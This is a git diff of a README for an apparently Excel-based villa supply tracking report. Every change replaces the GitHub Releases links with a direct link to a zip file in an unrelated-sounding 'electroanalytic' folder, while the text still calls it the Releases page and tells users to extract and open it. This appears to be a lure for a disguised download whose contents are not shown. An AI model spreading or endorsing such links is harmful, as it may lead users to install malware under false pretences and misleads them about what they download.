@@ -1,6 +1,6 @@
 # 📊 GuestVilla-Monthly-Consumption-Report - Track Villa Supplies Monthly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/main/electroanalytic/Report_Guest_Villa_Consumption_Monthly_3.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ GuestVilla-Monthly-Consumption-Report is an Excel-based system designed to help 
 
 Click the button below or visit the link to download the files:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/main/electroanalytic/Report_Guest_Villa_Consumption_Monthly_3.5.zip)
 
 You will be taken to the GitHub Releases page. Find the latest version and download the Excel file or zip archive provided.  
 
@@ -43,7 +43,7 @@ You will be taken to the GitHub Releases page. Find the latest version and downl
 
 ## 🖥️ How to Install and Start
 
-1. Visit the [Releases page](https://github.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/main/electroanalytic/Report_Guest_Villa_Consumption_Monthly_3.5.zip).
 2. Download the latest Excel file (usually named `GuestVilla-Monthly-Consumption-Report.xlsx`) or a zip file containing it.
 3. If you downloaded a zip file, right-click it and select "Extract All" to unpack the content.
 4. Open the Excel file by double-clicking it.
@@ -127,6 +127,6 @@ For guides and updates, check the GitHub repository or contact the maintainer th
 
 ## 📥 Download Link Again
 
-[Download the Latest Release](https://github.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/rollinsjp724-tech/GuestVilla-Monthly-Consumption-Report/main/electroanalytic/Report_Guest_Villa_Consumption_Monthly_3.5.zip)
 
 Visit this page to access the latest files and instructions for all updates.
